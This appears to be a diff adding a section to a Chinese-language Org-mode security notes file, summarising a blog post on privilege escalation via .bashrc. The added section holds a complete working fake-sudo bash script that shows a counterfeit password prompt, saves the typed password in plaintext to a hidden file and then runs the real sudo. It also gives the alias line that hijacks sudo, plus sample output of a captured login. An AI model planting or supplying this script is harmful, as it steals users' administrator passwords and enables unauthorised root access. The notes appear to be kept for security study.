@@ -283,6 +283,36 @@ completed.
 : all depends on my time available and how well this current series
 : does.
 
+** [[http://turbochaos.blogspot.jp/2013/11/ghetto-privilege-escalation-with-bashrc.html?view%3Dsidebar][Ghetto Privilege Escalation With .bashrc]]
+   好猥琐的手法。开始看作者其他的文章，一个人不可能一下子这么牛逼的。
+首先将下面脚本保存成fake-sudo.sh。命令行"chmod +x fake-sudo.sh"加上执行权限。
+在.bashrc加上"alias sudo="/location/to/fake-sudo.sh"。 #+begin_example
+#!/bin/bash
+if [ ! -f .chak ]; then                       #如不存在.chak文件
+ echo -n "[sudo] password for `whoami`: ";    #现实要求输入密码
+ stty -echo;                                  #关闭回显
+ read password;                               #读取密码，保存到变量password
+ stty echo;                                   #打开回显
+ echo -e $password > .chak;                   #将密码保存,-e:enable backslash escapes,测试无效果。
+ echo ""
+ sleep 2
+ echo "Sorry, try again";
+fi
+string="/bin/sudo"                            #$#：添加到shell中的参数个数
+while test $# -gt 0; do
+ string+=" $1";                               #添加$1
+ shift;                                       #命令参数左移，$3-->$2,$2-->$1,$1消失，$0保持不变。
+done
+$string                                       #执行命令
+#+end_example
+
+然后等下次作者sudo的时候，最后的结果：
+: ➜  ~  sudo yum search ssh
+: [sudo] password for ice: 
+: Sorry, try again
+: [sudo] password for ice: 
+然后.chak文件将保存你输入的密码。
+最后尝试下su命令不能写出对应的版本，因为su如果输入错误直接认证失败了，除非钩住登陆的方法。
 ** VFS
 [[http://security.tencent.com/index.php/opensource/detail/16][Linux Rootkit (vfs hook) 隐藏进程检测工具]]
 [[http://staronmytop.blog.51cto.com/6366057/1119475][Linux下的RootKit简单介绍与分析]]
